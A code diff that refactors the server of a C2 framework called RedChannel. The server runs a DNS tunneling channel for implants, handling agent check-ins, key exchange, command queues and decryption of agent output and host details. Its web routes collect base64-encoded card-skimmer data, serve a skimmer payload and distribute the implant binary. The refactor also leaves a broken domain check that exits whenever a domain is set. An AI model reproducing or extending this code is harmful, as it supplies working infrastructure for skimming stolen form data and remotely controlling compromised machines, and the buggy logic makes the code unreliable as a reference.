@@ -1,31 +1,27 @@
-const RC_VERSION = "0.3.0";
+import RedChannel, { AgentChannel, AgentCommands } from "./lib/redchannel";
+import RedChannelUI from "./lib/ui";
+import { emsg } from "./utils/utils";
+import chalk from "chalk";
+import * as dnsd from "dnsd";
+import * as util from "util";
+import * as fs from "fs";
+import * as crypto from "crypto";
+import { Command } from "commander";
 
 // move these to config?
 const FLOOD_PROTECTION_TIMEOUT = 10;
 const EXPECTED_DATA_SEGMENTS = 5;
 
-const chalk = require("chalk");
-const dnsd = require("dnsd");
-const util = require("util");
-const fs = require("fs");
-
-const Crypto = require("./lib/crypto.js");
-const crypto = new Crypto();
-
-const RedChannel = require("./lib/redchannel.js");
 const rc = new RedChannel(c2_message_handler);
-
-const RedChannelUI = require("./lib/ui.js");
-const ui = new RedChannelUI(rc, crypto);
+const ui = new RedChannelUI(rc);
 rc.ui = ui;
-rc.app_root = __dirname;
 
-const cli = require("commander");
-cli.version(RC_VERSION, "-v, --version")
+const cli = new Command();
+cli.version(rc.version, "-v, --version")
     .usage("[options]")
     .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", rc.config_file)
     .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
-    .option("-c, --c2-domain <domain>", "specify the c2 domain", "")
+    .option("-c, --domain <domain>", "specify the c2 domain", "")
     .option("-B, --ip [ip]", "bind dns c2 to ip", "")
     .option("-P, --port [port]", "listen for dns on a specific port", "")
     .option("-W, --web-ip [ip]", "bind web server to ip", "")
@@ -36,7 +32,7 @@ cli.version(RC_VERSION, "-v, --version")
 
     .parse(process.argv);
 
-rc.config_file = cli.config;
+rc.config_file = cli.getOptionValue("config");
 
 const banner = `
 ██████╗ ███████╗██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██╗     
@@ -49,31 +45,33 @@ const banner = `
 ui.msg(chalk.redBright(banner));
 
 // read config file and merge with defaults to ensure properties exist
-const merge = require("lodash.merge");
+import merge from "lodash.merge";
 try {
-    var config_data = JSON.parse(fs.readFileSync(rc.config_file).toString());
-    rc.config = merge(rc.config, config_data);
-} catch (err) {
-    ui.error(`cannot read configuration file: ${rc.config_file}, err: ${err.toString()}`);
+    const configData = JSON.parse(fs.readFileSync(rc.config_file).toString());
+    rc.config = merge(rc.config, configData);
+} catch (ex) {
+    ui.error(`cannot read configuration file: ${rc.config_file}, err: ${emsg(ex)}`);
     process.exit(1);
 }
 
+const rcPassword = cli.getOptionValue("password");
 // env password takes priority over commandline
 if (process.env.RC_PASSWORD && process.env.RC_PASSWORD.length > 0) {
     ui.info("using master password from environment variable");
     rc.config.c2.plaintext_password = process.env.RC_PASSWORD;
-    rc.master_password = crypto.libcrypto.createHash("md5").update(process.env.RC_PASSWORD).digest("hex");
-} else if (cli.password && cli.password.length > 0) {
+    rc.master_password = crypto.createHash("md5").update(process.env.RC_PASSWORD).digest("hex");
+} else if (rcPassword) {
     ui.info("using master password from cli");
-    rc.config.c2.plaintext_password = cli.password;
-    rc.master_password = crypto.libcrypto.createHash("md5").update(cli.password).digest("hex");
+    rc.config.c2.plaintext_password = rcPassword;
+    rc.master_password = crypto.createHash("md5").update(rcPassword).digest("hex");
 } else {
     ui.error("please specify a master c2 password via command-lie or environment variable, see '--help'");
     process.exit(1);
 }
 
-rc.config.c2.domain = cli.c2Domain.length > 0 ? cli.c2Domain : rc.config.c2.domain;
-if (rc.config.c2.domain.length == 0) {
+const rcDomain = cli.getOptionValue("domain") || rc.config.c2.domain;
+if (rcDomain) {
+    rc.config.c2.domain = rcDomain;
     ui.error("please specify the c2 domain via cli or config file, see '--help'");
     process.exit(1);
 }
@@ -81,14 +79,14 @@ if (rc.config.c2.domain.length == 0) {
 /**
  optional arguments, default values set by commander ^
  */
-if (cli.ip != "") rc.config.c2.dns_ip = cli.ip;
-if (cli.port != "") rc.config.c2.dns_port = cli.port;
-if (cli.webIp != "") rc.config.c2.web_ip = cli.webIp;
-if (cli.webPort != "") rc.config.c2.web_port = cli.webPort;
-if (cli.agentInterval != "") rc.config.implant.interval = cli.agentInterval;
-if (cli.agentResolver != "") rc.config.implant.resolver = cli.agentResolver;
+if (cli.getOptionValue("ip") != "") rc.config.c2.dns_ip = cli.getOptionValue("ip");
+if (cli.getOptionValue("port") != "") rc.config.c2.dns_port = cli.getOptionValue("port");
+if (cli.getOptionValue("webIp") != "") rc.config.c2.web_ip = cli.getOptionValue("webIp");
+if (cli.getOptionValue("webPort") != "") rc.config.c2.web_port = cli.getOptionValue("webPort");
+if (cli.getOptionValue("agentInterval") != "") rc.config.implant.interval = cli.getOptionValue("agentInterval");
+if (cli.getOptionValue("agentResolver") != "") rc.config.implant.resolver = cli.getOptionValue("agentResolver");
 
-rc.config.debug = cli.debug;
+rc.config.debug = cli.getOptionValue("debug");
 ui.debug(`loaded redchannel config: ${JSON.stringify(rc.config)}`);
 /**
  UI
@@ -97,9 +95,9 @@ ui.debug(`loaded redchannel config: ${JSON.stringify(rc.config)}`);
 /**
  Web channel
  */
-const web_server = require("express")();
+const webServer = require("express")();
 
-web_server.listen(rc.config.c2.web_port, rc.config.c2.web_ip, (err) => {
+webServer.listen(rc.config.c2.web_port, rc.config.c2.web_ip, (err) => {
     if (err) return ui.error(`failed to start web server: ${err}`);
     ui.info(`c2-web listening on: ${rc.config.c2.web_ip}:${rc.config.c2.web_port}`);
 });
@@ -109,31 +107,31 @@ web_server.listen(rc.config.c2.web_port, rc.config.c2.web_ip, (err) => {
  */
 
 // incoming skimmer data
-web_server.get(rc.config.skimmer.data_route, (request, response) => {
+webServer.get(rc.config.skimmer.data_route, (request, response) => {
     ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);
 
-    data = Buffer.from(request.query.id, "base64").toString();
-    ui.success(`incoming skimmer data: \n ${data}`);
+    const decodedData = Buffer.from(request.query.id, "base64").toString();
+    ui.success(`incoming skimmer data: \n ${decodedData}`);
     response.send("OK");
 });
 
 // server skimmer payload
-web_server.get(rc.config.skimmer.payload_route, (request, response) => {
+webServer.get(rc.config.skimmer.payload_route, (request, response) => {
     let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
     ui.warn(`incoming request for skimmer payload from ${ip}`);
     response.send(rc.modules.skimmer.payload);
 });
 
 // agent binary payload
-web_server.get(rc.config.c2.binary_route, (request, response) => {
+webServer.get(rc.config.c2.binary_route, (request, response) => {
     let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
     ui.warn(`incoming request for agent binary from ${ip}`);
     try {
         if (!fs.existsSync(rc.config.implant.output_file)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
         response.sendFile(rc.config.implant.output_file);
         ui.warn(`agent binary sent to ${ip}`);
-    } catch (e) {
-        ui.error(`agent binary not sent to ${ip}, err: ${e.message}`);
+    } catch (ex) {
+        ui.error(`agent binary not sent to ${ip}, err: ${emsg(ex)}`);
         response.status(404).send("404 File Not Found");
     }
 });
@@ -141,9 +139,9 @@ web_server.get(rc.config.c2.binary_route, (request, response) => {
 /**
  DNS channel
  */
-const dns_server = dnsd.createServer(c2_message_handler);
+const dnsServer = dnsd.createServer(c2_message_handler);
 // prettier-ignore
-dns_server
+dnsServer
     .zone(
         rc.config.c2.domain,
         "ns1." + rc.config.c2.domain,
@@ -186,10 +184,10 @@ function c2_message_handler(req, res) {
     var question = res.question[0];
     var hostname = question.name;
     var ttl = 300; // Math.floor(Math.random() 3600)
-    let channel = question.type === "PROXY" ? "proxy" : "dns";
+    let channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
 
     if (typeof rc.config.static_dns[hostname] != "undefined") {
-        ui.info(`static_dns: responding request for host: '${hostname}' with ip '${rc.config.static_dns[hostname]}'`);
+        ui.info(`static_dns: responding to request for host: '${hostname}' with ip '${rc.config.static_dns[hostname]}'`);
         res.answer.push({
             name: hostname,
             type: "A",
@@ -210,7 +208,7 @@ function c2_message_handler(req, res) {
         return res.end();
     }
 
-    var segments = hostname.slice(0, hostname.length - rc.config.c2.domain.length).split(".");
+    const segments = hostname.slice(0, hostname.length - rc.config.c2.domain.length).split(".");
     if (segments.length < EXPECTED_DATA_SEGMENTS) {
         ui.error(util.format("invalid message, not enough data segments (%d, expected %d): %s", segments.length, EXPECTED_DATA_SEGMENTS, hostname));
 
@@ -218,45 +216,45 @@ function c2_message_handler(req, res) {
     }
 
     // used to prevent flooding
-    var rand_id = segments[0];
+    const rand_id = segments[0];
 
-    var agent_id = segments[1];
+    const agent_id = segments[1];
     if (rc.agents[agent_id] == null) {
         rc.init_agent(agent_id, channel);
         ui.warn(`first ping from agent ${chalk.blue(agent_id)}, src: ${req.connection.remoteAddress}, channel: ${rc.agents[agent_id].channel}`);
 
-        if (!crypto.key) crypto.generate_keys();
+        if (!rc.crypto.privateKey) rc.crypto.generate_keys();
 
         ui.warn(`keyx started with agent ${chalk.blue(agent_id)}`);
-        rc.command_keyx(crypto.export_pubkey("uncompressed"), agent_id);
+        rc.command_keyx(agent_id);
     }
-    rc.agents[agent_id].lastseen = Math.floor(new Date() / 1000);
+    rc.agents[agent_id].lastseen = Math.floor(Date.now() / 1000);
     rc.agents[agent_id].ip = req.connection.remoteAddress;
 
-    var command = 0;
+    let command = 0;
     try {
         command = parseInt(segments[2].slice(0, 2), 16);
     } catch (ex) {
-        ui.error(`failed to parse command: ${ex.message}`);
+        ui.error(`failed to parse command: ${emsg(ex)}`);
 
         return res.end();
     }
 
     // no need to check the incoming data, just send a queued up msg
-    if (command == rc.AGENT_CHECKIN) {
+    if (command == AgentCommands.AGENT_CHECKIN) {
         if (channel !== rc.agents[agent_id].channel) {
             ui.warn(`agent ${chalk.blue(agent_id)} switching channel from ${rc.agents[agent_id].channel} to ${channel}`);
             rc.agents[agent_id].channel = channel;
         }
 
-        if (rc.agents[agent_id].sendq.length == 0) {
+        if (rc.agents[agent_id]?.sendq?.length == 0) {
             // 03 means no data to send
             ui.debug(`agent ${agent_id} checking in, no data to send`);
-            status = rc.make_ip_string("03");
+            const noDataStatus = rc.make_ip_string("03");
             res.answer.push({
                 name: hostname,
                 type: "AAAA",
-                data: status,
+                data: noDataStatus,
                 ttl: ttl,
             });
 
@@ -272,17 +270,16 @@ function c2_message_handler(req, res) {
             }, FLOOD_PROTECTION_TIMEOUT);
 
             ui.warn(`ignoring flood from agent: ${chalk.blue(agent_id)}, rid: ${rand_id}, command: ${command}`);
-
             return res.end();
         }
 
         ui.debug(`agent ${agent_id} checking in, sending next queued command`);
-        records = rc.agents[agent_id].sendq.shift();
-        records.forEach((r) => {
+        const records = rc.agents[agent_id]?.sendq?.shift();
+        records.forEach((record) => {
             res.answer.push({
                 name: hostname,
                 type: "AAAA",
-                data: r,
+                data: record,
                 ttl: ttl,
             });
         });
@@ -322,16 +319,16 @@ function c2_message_handler(req, res) {
 
     rc.agents[agent_id].recvq[command][data_id].chunks[current_chunk] = chunk;
     if (rc.count_data_chunks(rc.agents[agent_id].recvq[command][data_id].chunks) == total_chunks) {
-        data_to_process = rc.agents[agent_id].recvq[command][data_id].chunks.join("");
+        const dataChunks = rc.agents[agent_id].recvq[command][data_id].chunks.join("");
         delete rc.agents[agent_id].recvq[command][data_id];
 
         // process data, send back status (0f = failed, 02 = success)
-        status = process_dns_data(agent_id, command, data_to_process);
-        if (status) {
+        const processStatus = process_dns_data(agent_id, command, dataChunks);
+        if (processStatus) {
             res.answer.push({
                 name: hostname,
                 type: "AAAA",
-                data: status,
+                data: processStatus,
                 ttl: ttl,
             });
         }
@@ -340,11 +337,11 @@ function c2_message_handler(req, res) {
     }
 
     // last byte 01 indicates more data is expected
-    status = rc.make_ip_string("01");
+    const moreData = rc.make_ip_string("01");
     res.answer.push({
         name: hostname,
         type: "AAAA",
-        data: status,
+        data: moreData,
         ttl: ttl,
     });
 
@@ -366,80 +363,83 @@ function c2_message_handler(req, res) {
  */
 function process_dns_data(agent_id, command, data) {
     // default success status, 02 means data was received and processed successfully
-    var status = rc.make_ip_string("02");
+    const returnStatus = rc.make_ip_string("02");
+    let plaintext: string = "";
     switch (command) {
-        case rc.AGENT_KEYX:
+        case AgentCommands.AGENT_KEYX:
             if (!rc.agents[agent_id].allow_keyx) {
                 ui.error(`incoming keyx from ${chalk.blue(agent_id)} not allowed, initiate keyx first`);
                 break;
             }
 
-            if (!crypto.key) crypto.generate_keys();
+            if (!rc.crypto.privateKey) rc.crypto.generate_keys();
 
-            agent_pubkey = Buffer.from(data, "hex");
+            const agentPubkey = Buffer.from(data, "hex");
             try {
-                rc.agents[agent_id].keyx = crypto.import_uncompressed_pubkey(agent_pubkey);
+                rc.agents[agent_id].keyx = rc.crypto.import_uncompressed_pubkey(agentPubkey);
             } catch (ex) {
-                ui.error(`cannot import key for ${chalk.blue(agent_id)}: ${ex.message}`);
+                ui.error(`cannot import key for ${chalk.blue(agent_id)}: ${emsg(ex)}`);
                 break;
             }
             ui.success(`agent(${chalk.blue(agent_id)}) keyx: ${rc.agents[agent_id].keyx.asPublicECKey().toString("spki")}`);
 
             try {
-                rc.agents[agent_id].secret = crypto.derive_secret(rc.agents[agent_id].keyx, rc.master_password);
+                rc.agents[agent_id].secret = rc.crypto.derive_secret(rc.agents[agent_id].keyx, rc.master_password);
             } catch (ex) {
-                ui.error(`cannot derive secret for ${chalk.blue(agent_id)}: ${ex.message}`);
+                ui.error(`cannot derive secret for ${chalk.blue(agent_id)}: ${emsg(ex)}`);
                 break;
             }
-            ui.success(`agent(${chalk.blue(agent_id)}) secret: ${rc.agents[agent_id].secret.toString("hex")}`);
+            ui.success(`agent(${chalk.blue(agent_id)}) secret: ${rc.agents[agent_id].secret?.toString("hex")}`);
 
             // if there are no more queued up keyx's, ignore further keyxs from agent
-            if (!rc.is_command_in_sendq(agent_id, rc.AGENT_KEYX)) rc.agents[agent_id].allow_keyx = false;
+            if (!rc.is_command_in_sendq(agent_id, AgentCommands.AGENT_KEYX)) rc.agents[agent_id].allow_keyx = false;
             break;
-        case rc.AGENT_MSG:
+        case AgentCommands.AGENT_MSG:
+            plaintext = "";
             try {
                 plaintext = decrypt_dns_message(agent_id, data);
             } catch (ex) {
-                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${ex.message}`);
+                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${emsg(ex)}`);
                 break;
             }
             ui.success(`agent(${chalk.blue(agent_id)}) output>\n ${plaintext.toString()}`);
             break;
-        case rc.AGENT_SYSINFO:
+        case AgentCommands.AGENT_SYSINFO:
+            plaintext = "";
             try {
                 plaintext = decrypt_dns_message(agent_id, data);
             } catch (ex) {
-                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${ex.message}`);
+                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${emsg(ex)}`);
                 break;
             }
 
-            sysinfo = plaintext.toString().split(";");
-            userinfo = sysinfo[2].split(":");
-            rows = [
-                [chalk.yellowBright("hostname"), chalk.gray(sysinfo[0])],
-                [chalk.yellowBright("ips"), chalk.gray(sysinfo[1])],
-                [chalk.yellowBright("user"), chalk.gray(userinfo[0])],
-                [chalk.yellowBright("uid"), chalk.gray(userinfo[1])],
-                [chalk.yellowBright("gid"), chalk.gray(userinfo[2])],
+            const sysInfo = plaintext.toString().split(";");
+            const userInfo = sysInfo[2].split(":");
+            const displayRows = [
+                [chalk.yellowBright("hostname"), chalk.gray(sysInfo[0])],
+                [chalk.yellowBright("ips"), chalk.gray(sysInfo[1])],
+                [chalk.yellowBright("user"), chalk.gray(userInfo[0])],
+                [chalk.yellowBright("uid"), chalk.gray(userInfo[1])],
+                [chalk.yellowBright("gid"), chalk.gray(userInfo[2])],
             ];
 
             ui.success(`agent(${chalk.blue(agent_id)}) sysinfo>`);
-            ui.display_table([], rows);
+            ui.display_table([], displayRows);
             break;
     }
-    return status;
+    return returnStatus;
 }
 
-function decrypt_dns_message(agent_id, data) {
-    if (!agent_id) throw new Error("invalid agent id");
+function decrypt_dns_message(agentId, data) {
+    if (!agentId) throw new Error("invalid agent id");
     if (!data) throw new Error("invalid data");
-    if (!rc.agents[agent_id].keyx) throw new Error("missing keyx");
+    if (!rc.agents[agentId].keyx) throw new Error("missing keyx");
 
-    buffer = Buffer.from(data, "hex");
-    iv = buffer.slice(0, crypto.BLOCK_LENGTH);
-    ciphertext = buffer.slice(crypto.BLOCK_LENGTH);
+    const buffer = Buffer.from(data, "hex");
+    const iv = buffer.slice(0, rc.crypto.BLOCK_LENGTH);
+    const ciphertext = buffer.slice(rc.crypto.BLOCK_LENGTH);
 
     // may throw errors
-    plaintext = crypto.aes_decrypt(ciphertext, rc.agents[agent_id].secret, iv);
-    return plaintext;
+    const plaintext = rc.crypto.aes_decrypt(ciphertext, rc.agents[agentId].secret, iv);
+    return plaintext.toString();
 }
